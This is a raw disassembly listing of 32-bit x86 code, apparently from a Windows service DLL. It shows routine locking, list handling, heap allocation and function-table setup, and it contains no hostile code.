 1001662:	8b 45 0c             	mov    0xc(%ebp),%eax
 1001665:	bf 20 40 00 01       	mov    $0x1004020,%edi
 100166a:	57                   	push   %edi
 100166b:	89 46 10             	mov    %eax,0x10(%esi)
 100166e:	ff 15 68 10 00 01    	call   *0x1001068
 1001674:	a1 4c 40 00 01       	mov    0x100404c,%eax
 1001679:	c7 06 48 40 00 01    	movl   $0x1004048,(%esi)
 100167f:	89 46 04             	mov    %eax,0x4(%esi)
 1001682:	89 30                	mov    %esi,(%eax)
 1001684:	57                   	push   %edi
 1001685:	89 35 4c 40 00 01    	mov    %esi,0x100404c
 100168b:	ff 15 60 10 00 01    	call   *0x1001060
 1001691:	5f                   	pop    %edi
 1001692:	8b c6                	mov    %esi,%eax
 1001694:	5e                   	pop    %esi
 1001695:	5d                   	pop    %ebp
 1001696:	c2 0c 00             	ret    $0xc
 1001699:	8b 45 10             	mov    0x10(%ebp),%eax
 100169c:	89 38                	mov    %edi,(%eax)
 100169e:	eb f1                	jmp    0x1001691
 10016a0:	90                   	nop
 10016a1:	90                   	nop
 10016a2:	90                   	nop
 10016a3:	90                   	nop
 10016a4:	90                   	nop
 10016a5:	8b ff                	mov    %edi,%edi
 10016a7:	55                   	push   %ebp
 10016a8:	8b ec                	mov    %esp,%ebp
 10016aa:	83 ec 18             	sub    $0x18,%esp
 10016ad:	8b 45 0c             	mov    0xc(%ebp),%eax
 10016b0:	53                   	push   %ebx
 10016b1:	56                   	push   %esi
 10016b2:	57                   	push   %edi
 10016b3:	8b 38                	mov    (%eax),%edi
 10016b5:	33 f6                	xor    %esi,%esi
 10016b7:	bb 20 40 00 01       	mov    $0x1004020,%ebx
 10016bc:	53                   	push   %ebx
 10016bd:	89 75 f8             	mov    %esi,-0x8(%ebp)
 10016c0:	89 75 fc             	mov    %esi,-0x4(%ebp)
 10016c3:	89 75 ec             	mov    %esi,-0x14(%ebp)
 10016c6:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
 10016cd:	89 75 e8             	mov    %esi,-0x18(%ebp)
 10016d0:	ff 15 68 10 00 01    	call   *0x1001068
 10016d6:	39 35 40 40 00 01    	cmp    %esi,0x1004040
 10016dc:	0f 86 2e 01 00 00    	jbe    0x1001810
 10016e2:	21 75 f4             	and    %esi,-0xc(%ebp)
 10016e5:	90                   	nop
 10016e6:	90                   	nop
 10016e7:	90                   	nop
 10016e8:	90                   	nop
 10016e9:	90                   	nop
 10016ea:	90                   	nop
 10016eb:	90                   	nop
 10016ec:	90                   	nop
 10016ed:	90                   	nop
 10016ee:	90                   	nop
 10016ef:	90                   	nop
 10016f0:	a1 38 40 00 01       	mov    0x1004038,%eax
 10016f5:	8b 4d f4             	mov    -0xc(%ebp),%ecx
 10016f8:	ff 34 01             	push   (%ecx,%eax,1)
 10016fb:	57                   	push   %edi
 10016fc:	ff 15 7c 10 00 01    	call   *0x100107c
 1001702:	85 c0                	test   %eax,%eax
 1001704:	0f 84 42 fa ff ff    	je     0x100114c
 100170a:	83 45 f4 14          	addl   $0x14,-0xc(%ebp)
 100170e:	46                   	inc    %esi
 100170f:	3b 35 40 40 00 01    	cmp    0x1004040,%esi
 1001715:	0f 83 f5 00 00 00    	jae    0x1001810
 100171b:	eb d3                	jmp    0x10016f0
 100171d:	90                   	nop
 100171e:	90                   	nop
 100171f:	90                   	nop
 1001720:	90                   	nop
 1001721:	90                   	nop
 1001722:	8b ff                	mov    %edi,%edi
 1001724:	55                   	push   %ebp
 1001725:	8b ec                	mov    %esp,%ebp
 1001727:	83 ec 10             	sub    $0x10,%esp
 100172a:	53                   	push   %ebx
 100172b:	56                   	push   %esi
 100172c:	57                   	push   %edi
 100172d:	33 db                	xor    %ebx,%ebx
 100172f:	bf 20 40 00 01       	mov    $0x1004020,%edi
 1001734:	57                   	push   %edi
 1001735:	c7 45 f4 04 00 00 00 	movl   $0x4,-0xc(%ebp)
 100173c:	89 5d f8             	mov    %ebx,-0x8(%ebp)
 100173f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
 1001742:	ff 15 68 10 00 01    	call   *0x1001068
 1001748:	8b 75 08             	mov    0x8(%ebp),%esi
 100174b:	ff 4e 0c             	decl   0xc(%esi)
 100174e:	8d 45 fc             	lea    -0x4(%ebp),%eax
 1001751:	50                   	push   %eax
 1001752:	ff 36                	push   (%esi)
 1001754:	e8 85 fa ff ff       	call   0x10011de
 1001759:	85 c0                	test   %eax,%eax
 100175b:	75 23                	jne    0x1001780
 100175d:	8d 45 f4             	lea    -0xc(%ebp),%eax
 1001760:	50                   	push   %eax
 1001761:	8d 45 f8             	lea    -0x8(%ebp),%eax
 1001764:	50                   	push   %eax
 1001765:	8d 45 f0             	lea    -0x10(%ebp),%eax
 1001768:	50                   	push   %eax
 1001769:	53                   	push   %ebx
 100176a:	68 9c 17 00 01       	push   $0x100179c
 100176f:	ff 75 fc             	push   -0x4(%ebp)
 1001772:	ff 15 00 10 00 01    	call   *0x1001000
 1001778:	85 c0                	test   %eax,%eax
 100177a:	0f 84 05 06 00 00    	je     0x1001d85
 1001780:	57                   	push   %edi
 1001781:	ff 15 60 10 00 01    	call   *0x1001060
 1001787:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
 100178a:	5f                   	pop    %edi
 100178b:	5e                   	pop    %esi
 100178c:	5b                   	pop    %ebx
 100178d:	74 09                	je     0x1001798
 100178f:	ff 75 fc             	push   -0x4(%ebp)
 1001792:	ff 15 2c 10 00 01    	call   *0x100102c
 1001798:	c9                   	leave
 1001799:	c2 04 00             	ret    $0x4
 100179c:	53                   	push   %ebx
 100179d:	00 65 00             	add    %ah,0x0(%ebp)
 10017a0:	72 00                	jb     0x10017a2
 10017a2:	76 00                	jbe    0x10017a4
 10017a4:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
 10017aa:	44                   	inc    %esp
 10017ab:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
 10017af:	00 55 00             	add    %dl,0x0(%ebp)
 10017b2:	6e                   	outsb  %ds:(%esi),(%dx)
 10017b3:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
 10017b7:	00 61 00             	add    %ah,0x0(%ecx)
 10017ba:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
 10017be:	6e                   	outsb  %ds:(%esi),(%dx)
 10017bf:	00 53 00             	add    %dl,0x0(%ebx)
 10017c2:	74 00                	je     0x10017c4
 10017c4:	6f                   	outsl  %ds:(%esi),(%dx)
 10017c5:	00 70 00             	add    %dh,0x0(%eax)
 10017c8:	00 00                	add    %al,(%eax)
 10017ca:	a1 50 40 00 01       	mov    0x1004050,%eax
 10017cf:	3b c3                	cmp    %ebx,%eax
 10017d1:	0f 84 da f9 ff ff    	je     0x10011b1
 10017d7:	50                   	push   %eax
 10017d8:	ff 55 fc             	call   *-0x4(%ebp)
 10017db:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
 10017de:	0f 85 df f9 ff ff    	jne    0x10011c3
 10017e4:	e9 49 12 00 00       	jmp    0x1002a32
 10017e9:	39 05 50 40 00 01    	cmp    %eax,0x1004050
 10017ef:	0f 85 86 f9 ff ff    	jne    0x100117b
 10017f5:	e8 e9 02 00 00       	call   0x1001ae3
 10017fa:	e9 7c f9 ff ff       	jmp    0x100117b
 10017ff:	39 05 50 40 00 01    	cmp    %eax,0x1004050
 1001805:	0f 84 87 f9 ff ff    	je     0x1001192
 100180b:	e9 8c f9 ff ff       	jmp    0x100119c
 1001810:	8b 7d ec             	mov    -0x14(%ebp),%edi
 1001813:	8b 75 e8             	mov    -0x18(%ebp),%esi
 1001816:	e9 84 f9 ff ff       	jmp    0x100119f
 100181b:	3b fb                	cmp    %ebx,%edi
 100181d:	0f 84 af f9 ff ff    	je     0x10011d2
 1001823:	e9 20 12 00 00       	jmp    0x1002a48
 1001828:	90                   	nop
 1001829:	90                   	nop
 100182a:	90                   	nop
 100182b:	90                   	nop
 100182c:	90                   	nop
 100182d:	8b ff                	mov    %edi,%edi
 100182f:	56                   	push   %esi
 1001830:	be 54 40 00 01       	mov    $0x1004054,%esi
 1001835:	56                   	push   %esi
 1001836:	ff 15 68 10 00 01    	call   *0x1001068
 100183c:	ff 05 6c 40 00 01    	incl   0x100406c
 1001842:	56                   	push   %esi
 1001843:	ff 15 60 10 00 01    	call   *0x1001060
 1001849:	5e                   	pop    %esi
 100184a:	c3                   	ret
 100184b:	8b 45 f8             	mov    -0x8(%ebp),%eax
 100184e:	3b 45 10             	cmp    0x10(%ebp),%eax
 1001851:	75 56                	jne    0x10018a9
 1001853:	39 7d fc             	cmp    %edi,-0x4(%ebp)
 1001856:	74 51                	je     0x10018a9
 1001858:	6a 0e                	push   $0xe
 100185a:	5b                   	pop    %ebx
 100185b:	ff 75 fc             	push   -0x4(%ebp)
 100185e:	57                   	push   %edi
 100185f:	e8 4d fa ff ff       	call   0x10012b1
 1001864:	3b c7                	cmp    %edi,%eax
 1001866:	89 45 10             	mov    %eax,0x10(%ebp)
 1001869:	0f 84 15 fd ff ff    	je     0x1001584
 100186f:	8d 4d fc             	lea    -0x4(%ebp),%ecx
 1001872:	51                   	push   %ecx
 1001873:	50                   	push   %eax
 1001874:	8d 45 f8             	lea    -0x8(%ebp),%eax
 1001877:	50                   	push   %eax
 1001878:	57                   	push   %edi
 1001879:	ff 75 0c             	push   0xc(%ebp)
 100187c:	ff 75 08             	push   0x8(%ebp)
 100187f:	ff d6                	call   *%esi
 1001881:	8b d8                	mov    %eax,%ebx
 1001883:	3b df                	cmp    %edi,%ebx
 1001885:	75 15                	jne    0x100189c
 1001887:	8b 45 10             	mov    0x10(%ebp),%eax
 100188a:	8b 4d 14             	mov    0x14(%ebp),%ecx
 100188d:	89 01                	mov    %eax,(%ecx)
 100188f:	8b 45 fc             	mov    -0x4(%ebp),%eax
 1001892:	8b 4d 18             	mov    0x18(%ebp),%ecx
 1001895:	89 01                	mov    %eax,(%ecx)
 1001897:	e9 e8 fc ff ff       	jmp    0x1001584
 100189c:	ff 75 10             	push   0x10(%ebp)
 100189f:	e8 12 00 00 00       	call   0x10018b6
 10018a4:	e9 db fc ff ff       	jmp    0x1001584
 10018a9:	6a 0d                	push   $0xd
 10018ab:	5b                   	pop    %ebx
 10018ac:	e9 d3 fc ff ff       	jmp    0x1001584
 10018b1:	90                   	nop
 10018b2:	90                   	nop
 10018b3:	90                   	nop
 10018b4:	90                   	nop
 10018b5:	90                   	nop
 10018b6:	8b ff                	mov    %edi,%edi
 10018b8:	55                   	push   %ebp
 10018b9:	8b ec                	mov    %esp,%ebp
 10018bb:	ff 75 08             	push   0x8(%ebp)
 10018be:	6a 00                	push   $0x0
 10018c0:	ff 35 3c 40 00 01    	push   0x100403c
 10018c6:	ff 15 3c 10 00 01    	call   *0x100103c
 10018cc:	5d                   	pop    %ebp
 10018cd:	c2 04 00             	ret    $0x4
 10018d0:	53                   	push   %ebx
 10018d1:	57                   	push   %edi
 10018d2:	ff 75 10             	push   0x10(%ebp)
 10018d5:	ff 15 48 10 00 01    	call   *0x1001048
 10018db:	8b 3d 44 10 00 01    	mov    0x1001044,%edi
 10018e1:	56                   	push   %esi
 10018e2:	56                   	push   %esi
 10018e3:	56                   	push   %esi
 10018e4:	56                   	push   %esi
 10018e5:	8b d8                	mov    %eax,%ebx
 10018e7:	43                   	inc    %ebx
 10018e8:	53                   	push   %ebx
 10018e9:	ff 75 10             	push   0x10(%ebp)
 10018ec:	56                   	push   %esi
 10018ed:	56                   	push   %esi
 10018ee:	ff d7                	call   *%edi
 10018f0:	3b c6                	cmp    %esi,%eax
 10018f2:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10018f5:	74 36                	je     0x100192d
 10018f7:	50                   	push   %eax
 10018f8:	56                   	push   %esi
 10018f9:	c7 45 0c 0e 00 00 00 	movl   $0xe,0xc(%ebp)
 1001900:	e8 ac f9 ff ff       	call   0x10012b1
 1001905:	3b c6                	cmp    %esi,%eax
 1001907:	89 45 08             	mov    %eax,0x8(%ebp)
 100190a:	74 21                	je     0x100192d
 100190c:	56                   	push   %esi
 100190d:	56                   	push   %esi
 100190e:	ff 75 fc             	push   -0x4(%ebp)
 1001911:	89 75 0c             	mov    %esi,0xc(%ebp)
 1001914:	50                   	push   %eax
 1001915:	53                   	push   %ebx
 1001916:	ff 75 10             	push   0x10(%ebp)
 1001919:	56                   	push   %esi
 100191a:	56                   	push   %esi
 100191b:	ff d7                	call   *%edi
 100191d:	85 c0                	test   %eax,%eax
 100191f:	0f 84 57 10 00 00    	je     0x100297c
 1001925:	8b 45 08             	mov    0x8(%ebp),%eax
 1001928:	8b 4d 14             	mov    0x14(%ebp),%ecx
 100192b:	89 01                	mov    %eax,(%ecx)
 100192d:	ff 75 10             	push   0x10(%ebp)
 1001930:	e8 81 ff ff ff       	call   0x10018b6
 1001935:	5f                   	pop    %edi
 1001936:	5b                   	pop    %ebx
 1001937:	e9 81 fc ff ff       	jmp    0x10015bd
 100193c:	8b 45 0c             	mov    0xc(%ebp),%eax
 100193f:	ff 30                	push   (%eax)
 1001941:	8b 46 10             	mov    0x10(%esi),%eax
 1001944:	ff 30                	push   (%eax)
 1001946:	ff d3                	call   *%ebx
 1001948:	85 c0                	test   %eax,%eax
 100194a:	0f 84 c4 fc ff ff    	je     0x1001614
 1001950:	e9 b5 fc ff ff       	jmp    0x100160a
 1001955:	90                   	nop
 1001956:	90                   	nop
 1001957:	90                   	nop
 1001958:	90                   	nop
 1001959:	90                   	nop
 100195a:	8b ff                	mov    %edi,%edi
 100195c:	55                   	push   %ebp
 100195d:	8b ec                	mov    %esp,%ebp
 100195f:	51                   	push   %ecx
 1001960:	53                   	push   %ebx
 1001961:	56                   	push   %esi
 1001962:	33 f6                	xor    %esi,%esi
 1001964:	33 db                	xor    %ebx,%ebx
 1001966:	39 75 08             	cmp    %esi,0x8(%ebp)
 1001969:	89 75 fc             	mov    %esi,-0x4(%ebp)
 100196c:	0f 84 da 00 00 00    	je     0x1001a4c
 1001972:	39 75 0c             	cmp    %esi,0xc(%ebp)
 1001975:	0f 84 d1 00 00 00    	je     0x1001a4c
 100197b:	39 75 10             	cmp    %esi,0x10(%ebp)
 100197e:	0f 84 c8 00 00 00    	je     0x1001a4c
 1001984:	39 75 14             	cmp    %esi,0x14(%ebp)
 1001987:	0f 84 bf 00 00 00    	je     0x1001a4c
 100198d:	57                   	push   %edi
 100198e:	68 20 40 00 01       	push   $0x1004020
 1001993:	ff 15 68 10 00 01    	call   *0x1001068
 1001999:	39 35 40 40 00 01    	cmp    %esi,0x1004040
 100199f:	0f 86 9e 00 00 00    	jbe    0x1001a43
 10019a5:	33 ff                	xor    %edi,%edi
 10019a7:	a1 38 40 00 01       	mov    0x1004038,%eax
 10019ac:	ff 34 07             	push   (%edi,%eax,1)
 10019af:	ff 75 0c             	push   0xc(%ebp)
 10019b2:	ff 15 7c 10 00 01    	call   *0x100107c
 10019b8:	85 c0                	test   %eax,%eax
 10019ba:	74 0e                	je     0x10019ca
 10019bc:	46                   	inc    %esi
 10019bd:	83 c7 14             	add    $0x14,%edi
 10019c0:	3b 35 40 40 00 01    	cmp    0x1004040,%esi
 10019c6:	73 7b                	jae    0x1001a43
 10019c8:	eb dd                	jmp    0x10019a7
 10019ca:	8b 0d 38 40 00 01    	mov    0x1004038,%ecx
 10019d0:	8d 04 b6             	lea    (%esi,%esi,4),%eax
 10019d3:	8d 34 81             	lea    (%ecx,%eax,4),%esi
 10019d6:	85 f6                	test   %esi,%esi
 10019d8:	74 69                	je     0x1001a43
 10019da:	83 7e 10 00          	cmpl   $0x0,0x10(%esi)
 10019de:	75 63                	jne    0x1001a43
 10019e0:	6a 08                	push   $0x8
 10019e2:	5f                   	pop    %edi
 10019e3:	57                   	push   %edi
 10019e4:	57                   	push   %edi
 10019e5:	e8 c7 f8 ff ff       	call   0x10012b1
 10019ea:	8b d8                	mov    %eax,%ebx
 10019ec:	85 db                	test   %ebx,%ebx
 10019ee:	0f 84 b4 10 00 00    	je     0x1002aa8
 10019f4:	ff 75 1c             	push   0x1c(%ebp)
 10019f7:	8b 45 18             	mov    0x18(%ebp),%eax
 10019fa:	6a ff                	push   $0xffffffff
 10019fc:	53                   	push   %ebx
 10019fd:	68 b3 2e 00 01       	push   $0x1002eb3
 1001a02:	ff 75 10             	push   0x10(%ebp)
 1001a05:	89 03                	mov    %eax,(%ebx)
 1001a07:	ff 75 08             	push   0x8(%ebp)
 1001a0a:	89 73 04             	mov    %esi,0x4(%ebx)
 1001a0d:	ff 15 98 10 00 01    	call   *0x1001098
 1001a13:	85 c0                	test   %eax,%eax
 1001a15:	0f 84 95 10 00 00    	je     0x1002ab0
 1001a1b:	8b 45 14             	mov    0x14(%ebp),%eax
 1001a1e:	ff 46 0c             	incl   0xc(%esi)
 1001a21:	89 46 10             	mov    %eax,0x10(%esi)
 1001a24:	68 20 40 00 01       	push   $0x1004020
 1001a29:	ff 15 60 10 00 01    	call   *0x1001060
 1001a2f:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
 1001a33:	5f                   	pop    %edi
 1001a34:	0f 85 63 10 00 00    	jne    0x1002a9d
 1001a3a:	8b 45 fc             	mov    -0x4(%ebp),%eax
 1001a3d:	5e                   	pop    %esi
 1001a3e:	5b                   	pop    %ebx
 1001a3f:	c9                   	leave
 1001a40:	c2 18 00             	ret    $0x18
 1001a43:	c7 45 fc 0d 00 00 00 	movl   $0xd,-0x4(%ebp)
 1001a4a:	eb d8                	jmp    0x1001a24
 1001a4c:	6a 57                	push   $0x57
 1001a4e:	58                   	pop    %eax
 1001a4f:	eb ec                	jmp    0x1001a3d
 1001a51:	90                   	nop
 1001a52:	90                   	nop
 1001a53:	90                   	nop
 1001a54:	90                   	nop
 1001a55:	90                   	nop
 1001a56:	8b ff                	mov    %edi,%edi
 1001a58:	57                   	push   %edi
 1001a59:	68 54 40 00 01       	push   $0x1004054
 1001a5e:	ff 15 88 10 00 01    	call   *0x1001088
 1001a64:	6a 08                	push   $0x8
 1001a66:	59                   	pop    %ecx
 1001a67:	33 c0                	xor    %eax,%eax
 1001a69:	21 05 6c 40 00 01    	and    %eax,0x100406c
 1001a6f:	bf cc 41 00 01       	mov    $0x10041cc,%edi
 1001a74:	f3 ab                	rep stos %eax,%es:(%edi)
 1001a76:	5f                   	pop    %edi
 1001a77:	c3                   	ret
 1001a78:	90                   	nop
 1001a79:	90                   	nop
 1001a7a:	90                   	nop
 1001a7b:	90                   	nop
 1001a7c:	90                   	nop
 1001a7d:	68 74 40 00 01       	push   $0x1004074
 1001a82:	ff 15 88 10 00 01    	call   *0x1001088
 1001a88:	83 25 70 40 00 01 00 	andl   $0x0,0x1004070
 1001a8f:	33 c0                	xor    %eax,%eax
 1001a91:	c3                   	ret
 1001a92:	90                   	nop
 1001a93:	90                   	nop
 1001a94:	90                   	nop
 1001a95:	90                   	nop
 1001a96:	90                   	nop
 1001a97:	8b ff                	mov    %edi,%edi
 1001a99:	55                   	push   %ebp
 1001a9a:	8b ec                	mov    %esp,%ebp
 1001a9c:	56                   	push   %esi
 1001a9d:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
 1001aa3:	ff 75 10             	push   0x10(%ebp)
 1001aa6:	8b f0                	mov    %eax,%esi
 1001aa8:	ff 15 f4 10 00 01    	call   *0x10010f4
 1001aae:	50                   	push   %eax
 1001aaf:	8b 46 30             	mov    0x30(%esi),%eax
 1001ab2:	6a 00                	push   $0x0
 1001ab4:	ff 70 18             	push   0x18(%eax)
 1001ab7:	ff 15 e4 10 00 01    	call   *0x10010e4
 1001abd:	85 c0                	test   %eax,%eax
 1001abf:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1001ac2:	89 01                	mov    %eax,(%ecx)
 1001ac4:	5e                   	pop    %esi
 1001ac5:	0f 84 53 13 00 00    	je     0x1002e1e
 1001acb:	ff 75 10             	push   0x10(%ebp)
 1001ace:	ff 75 0c             	push   0xc(%ebp)
 1001ad1:	50                   	push   %eax
 1001ad2:	ff 15 f0 10 00 01    	call   *0x10010f0
 1001ad8:	33 c0                	xor    %eax,%eax
 1001ada:	5d                   	pop    %ebp
 1001adb:	c2 0c 00             	ret    $0xc
 1001ade:	90                   	nop
 1001adf:	90                   	nop
 1001ae0:	90                   	nop
 1001ae1:	90                   	nop
 1001ae2:	90                   	nop
 1001ae3:	f6 05 c8 41 00 01 01 	testb  $0x1,0x10041c8
 1001aea:	75 0c                	jne    0x1001af8
 1001aec:	e8 8c ff ff ff       	call   0x1001a7d
 1001af1:	83 0d c8 41 00 01 01 	orl    $0x1,0x10041c8
 1001af8:	f6 05 c8 41 00 01 02 	testb  $0x2,0x10041c8
 1001aff:	75 0c                	jne    0x1001b0d
 1001b01:	e8 50 ff ff ff       	call   0x1001a56
 1001b06:	83 0d c8 41 00 01 02 	orl    $0x2,0x10041c8
 1001b0d:	f6 05 c8 41 00 01 04 	testb  $0x4,0x10041c8
 1001b14:	75 14                	jne    0x1001b2a
 1001b16:	e8 75 01 00 00       	call   0x1001c90
 1001b1b:	85 c0                	test   %eax,%eax
 1001b1d:	0f 8c 67 01 00 00    	jl     0x1001c8a
 1001b23:	83 0d c8 41 00 01 04 	orl    $0x4,0x10041c8
 1001b2a:	6a 64                	push   $0x64
 1001b2c:	6a 08                	push   $0x8
 1001b2e:	e8 7e f7 ff ff       	call   0x10012b1
 1001b33:	85 c0                	test   %eax,%eax
 1001b35:	a3 50 40 00 01       	mov    %eax,0x1004050
 1001b3a:	0f 84 4a 01 00 00    	je     0x1001c8a
 1001b40:	8b 0d 40 41 00 01    	mov    0x1004140,%ecx
 1001b46:	89 08                	mov    %ecx,(%eax)
 1001b48:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001b4d:	8b 0d 44 41 00 01    	mov    0x1004144,%ecx
 1001b53:	89 48 04             	mov    %ecx,0x4(%eax)
 1001b56:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001b5b:	8b 0d 48 41 00 01    	mov    0x1004148,%ecx
 1001b61:	89 48 08             	mov    %ecx,0x8(%eax)
 1001b64:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001b69:	8b 0d 4c 41 00 01    	mov    0x100414c,%ecx
 1001b6f:	89 48 0c             	mov    %ecx,0xc(%eax)
 1001b72:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001b77:	8b 0d 50 41 00 01    	mov    0x1004150,%ecx
 1001b7d:	89 48 10             	mov    %ecx,0x10(%eax)
 1001b80:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001b85:	8b 0d 54 41 00 01    	mov    0x1004154,%ecx
 1001b8b:	89 48 14             	mov    %ecx,0x14(%eax)
 1001b8e:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001b93:	8b 0d 58 41 00 01    	mov    0x1004158,%ecx
 1001b99:	89 48 18             	mov    %ecx,0x18(%eax)
 1001b9c:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001ba1:	8b 0d 5c 41 00 01    	mov    0x100415c,%ecx
 1001ba7:	89 48 1c             	mov    %ecx,0x1c(%eax)
 1001baa:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001baf:	8b 0d 60 41 00 01    	mov    0x1004160,%ecx
 1001bb5:	89 48 20             	mov    %ecx,0x20(%eax)
 1001bb8:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001bbd:	8b 0d 64 41 00 01    	mov    0x1004164,%ecx
 1001bc3:	89 48 24             	mov    %ecx,0x24(%eax)
 1001bc6:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001bcb:	8b 0d a8 41 00 01    	mov    0x10041a8,%ecx
 1001bd1:	89 48 28             	mov    %ecx,0x28(%eax)
 1001bd4:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001bd9:	8b 0d ac 41 00 01    	mov    0x10041ac,%ecx
 1001bdf:	89 48 2c             	mov    %ecx,0x2c(%eax)
 1001be2:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001be7:	8b 0d b0 41 00 01    	mov    0x10041b0,%ecx
 1001bed:	89 48 30             	mov    %ecx,0x30(%eax)
 1001bf0:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001bf5:	8b 0d b4 41 00 01    	mov    0x10041b4,%ecx
 1001bfb:	89 48 34             	mov    %ecx,0x34(%eax)
 1001bfe:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001c03:	8b 0d b8 41 00 01    	mov    0x10041b8,%ecx
 1001c09:	89 48 38             	mov    %ecx,0x38(%eax)
 1001c0c:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001c11:	8b 0d bc 41 00 01    	mov    0x10041bc,%ecx
 1001c17:	89 48 3c             	mov    %ecx,0x3c(%eax)
 1001c1a:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001c1f:	8b 0d c0 41 00 01    	mov    0x10041c0,%ecx
 1001c25:	89 48 40             	mov    %ecx,0x40(%eax)
 1001c28:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001c2d:	8b 0d c4 41 00 01    	mov    0x10041c4,%ecx
 1001c33:	89 48 44             	mov    %ecx,0x44(%eax)
 1001c36:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001c3b:	c7 40 48 e0 1d 00 01 	movl   $0x1001de0,0x48(%eax)
 1001c42:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001c47:	c7 40 4c ca 31 00 01 	movl   $0x10031ca,0x4c(%eax)
 1001c4e:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001c53:	c7 40 50 1b 32 00 01 	movl   $0x100321b,0x50(%eax)
 1001c5a:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001c5f:	c7 40 54 2d 18 00 01 	movl   $0x100182d,0x54(%eax)
 1001c66:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001c6b:	c7 40 58 fc 2e 00 01 	movl   $0x1002efc,0x58(%eax)
 1001c72:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001c77:	c7 40 5c 19 30 00 01 	movl   $0x1003019,0x5c(%eax)
 1001c7e:	a1 50 40 00 01       	mov    0x1004050,%eax
 1001c83:	c7 40 60 5a 19 00 01 	movl   $0x100195a,0x60(%eax)
 1001c8a:	c3                   	ret
 1001c8b:	90                   	nop
 1001c8c:	90                   	nop
 1001c8d:	90                   	nop
 1001c8e:	90                   	nop
 1001c8f:	90                   	nop
 1001c90:	8b ff                	mov    %edi,%edi
 1001c92:	56                   	push   %esi
 1001c93:	57                   	push   %edi
 1001c94:	33 f6                	xor    %esi,%esi
 1001c96:	6a 01                	push   $0x1
 1001c98:	8d 86 a4 40 00 01    	lea    0x10040a4(%esi),%eax
 1001c9e:	50                   	push   %eax
 1001c9f:	8d be a0 40 00 01    	lea    0x10040a0(%esi),%edi
 1001ca5:	ff 37                	push   (%edi)
 1001ca7:	e8 eb fd ff ff       	call   0x1001a97
 1001cac:	85 c0                	test   %eax,%eax
 1001cae:	7c 49                	jl     0x1001cf9
 1001cb0:	8b 07                	mov    (%edi),%eax
 1001cb2:	6a 00                	push   $0x0
 1001cb4:	ff 30                	push   (%eax)
 1001cb6:	ff 15 f8 10 00 01    	call   *0x10010f8
 1001cbc:	8b 8e ac 40 00 01    	mov    0x10040ac(%esi),%ecx
 1001cc2:	83 c6 10             	add    $0x10,%esi
 1001cc5:	81 fe a0 00 00 00    	cmp    $0xa0,%esi
 1001ccb:	89 08                	mov    %ecx,(%eax)
 1001ccd:	72 c7                	jb     0x1001c96
 1001ccf:	33 f6                	xor    %esi,%esi
 1001cd1:	ff b6 68 41 00 01    	push   0x1004168(%esi)
 1001cd7:	ff b6 6c 41 00 01    	push   0x100416c(%esi)
 1001cdd:	ff 35 5c 41 00 01    	push   0x100415c
 1001ce3:	e8 1d 00 00 00       	call   0x1001d05
 1001ce8:	85 c0                	test   %eax,%eax
 1001cea:	7c 0d                	jl     0x1001cf9
 1001cec:	83 c6 08             	add    $0x8,%esi
 1001cef:	83 fe 40             	cmp    $0x40,%esi
 1001cf2:	72 dd                	jb     0x1001cd1
 1001cf4:	33 c0                	xor    %eax,%eax
 1001cf6:	5f                   	pop    %edi
 1001cf7:	5e                   	pop    %esi
 1001cf8:	c3                   	ret
 1001cf9:	b8 17 00 00 c0       	mov    $0xc0000017,%eax
 1001cfe:	eb f6                	jmp    0x1001cf6
 1001d00:	90                   	nop
 1001d01:	90                   	nop
 1001d02:	90                   	nop
 1001d03:	90                   	nop
 1001d04:	90                   	nop
 1001d05:	8b ff                	mov    %edi,%edi
 1001d07:	55                   	push   %ebp
 1001d08:	8b ec                	mov    %esp,%ebp
 1001d0a:	51                   	push   %ecx
 1001d0b:	51                   	push   %ecx
 1001d0c:	53                   	push   %ebx
 1001d0d:	56                   	push   %esi
 1001d0e:	57                   	push   %edi
 1001d0f:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
 1001d15:	8b 40 30             	mov    0x30(%eax),%eax
 1001d18:	8b 70 18             	mov    0x18(%eax),%esi
 1001d1b:	ff 75 08             	push   0x8(%ebp)
 1001d1e:	8b 1d 00 11 00 01    	mov    0x1001100,%ebx
 1001d24:	89 75 f8             	mov    %esi,-0x8(%ebp)
 1001d27:	ff d3                	call   *%ebx
 1001d29:	0f b6 38             	movzbl (%eax),%edi
 1001d2c:	8d 47 01             	lea    0x1(%edi),%eax
 1001d2f:	50                   	push   %eax
 1001d30:	ff 15 f4 10 00 01    	call   *0x10010f4
 1001d36:	50                   	push   %eax
 1001d37:	6a 00                	push   $0x0
 1001d39:	56                   	push   %esi
 1001d3a:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1001d3d:	ff 15 e4 10 00 01    	call   *0x10010e4
 1001d43:	85 c0                	test   %eax,%eax
